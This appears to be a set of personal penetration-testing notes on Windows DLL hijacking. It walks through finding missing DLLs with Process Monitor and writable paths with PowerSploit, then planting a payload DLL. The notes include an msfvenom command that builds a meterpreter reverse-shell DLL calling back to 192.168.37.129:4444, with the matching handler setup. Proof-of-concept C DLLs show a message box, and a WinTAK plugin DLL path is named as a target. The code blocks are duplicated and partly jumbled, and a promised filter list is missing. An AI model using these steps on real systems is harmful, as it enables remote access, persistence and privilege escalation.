# DLL Hijacking

  DLL hijacking is, in the broadest sense, tricking a legitimate/trusted application into loading an arbitrary DLL. 
Motives:
Execution: executing malicious code through a trusted executable may be less likely to set off alarm bells, and in some cases even bypasses application whitelist features such as AppLocker. The technique also allowed exe, dll, and dat files to be loaded into memory, another means to evade detection.  
Persistence: if the target application is pre-installed and runs regularly, so will the malicious code)
Privilege escalation: if the target application runs under elevated permissions, so will the malicious code

Identify processes running as SYSTEM:
Go into Task Manager > Details, and see what user is running the process
This is if you are looking for privesc
Find  missing DLLs:
Use process monitor and apply three filters:

Optional: User is NT AUTHORITY\SYSTEM
And apply
Look through DLLs that the application tries to load and the actual path that the application is looking for the missing DLL.
These are all potential hijackable DLL candidates. However, it does not automatically follow that all of these are also loaded (and therefore executed). The most reliable way to find out which DLLs are properly loaded, is to compile our own version of the DLL, and make it write to a unique file upon successfully loading. If we then repeat the above approach for all target executables and DLLs, it will result in a collection of files that tells us which DLLs are confirmed vulnerable to DLL hijacking. Compiling custom versions of existing DLLs is more challenging than it may sound, as a lot of executables will not load such DLLs if procedures or entry points are missing.
So use PEview
Find directories you have permissions to write a malicious DLL in:
Set-ExecutionPolicy Unrestricted
cd C:\Path\To\PowerSploit
Import-Module .\Privesc
Find-PathDLLHijack
Write your fake DLL:
Reverse shell via msfvenom: 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.37.129 LPORT=4444 -f dll > FiresTool.dll
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.37.129
set LPORT 4444
exploit

## Windows popup:
Write a C file:
~~~
#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch (dwReason)
  {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, "hijack achieved", "kathleen", MB_ICONERROR | MB_OK);
      break;
  } // end of switch
  return TRUE;
} // END OF DllMain
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

extern "C" __declspec(dllexport) void MyNullStub()
{}

extern "C" __declspec(dllexport)
DWORD WINAPI MyMessageBox(LPVOID lpParam) {
  MessageBox(NULL, "DLL_PROCESS_ATTACH called!", "Hijacked", NULL);
  return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved) {
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, MyMessageBox, NULL, NULL, NULL);;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}


Compile the C file:
x86_64-w64-mingw32-gcc-win32 dll.c -o FiresTool.dll -shared
Check you compiled correctly:
file FiresTool.dll should return FiresTool.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows



C:\Users\MCAT\AppData\Roaming\WinTAK\Plugins\Reports\Reports.dll


https://pentestlab.blog/2017/03/27/dll-hijacking/
https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows 


BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch (dwReason)
  {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, "hijack achieved", "kathleen", MB_ICONERROR | MB_OK);
      break;
  } // end of switch
  return TRUE;
} // END OF DllMain
~~~
~~~
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

extern "C" __declspec(dllexport) void MyNullStub()
{}

extern "C" __declspec(dllexport)
DWORD WINAPI MyMessageBox(LPVOID lpParam) {
  MessageBox(NULL, "DLL_PROCESS_ATTACH called!", "Hijacked", NULL);
  return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved) {
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, MyMessageBox, NULL, NULL, NULL);;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
~~~

Compile the C file:
```x86_64-w64-mingw32-gcc-win32 dll.c -o FiresTool.dll -shared```
Check you compiled correctly:
```file FiresTool.dll``` should return ```FiresTool.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows```



https://pentestlab.blog/2017/03/27/dll-hijacking/
https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows 
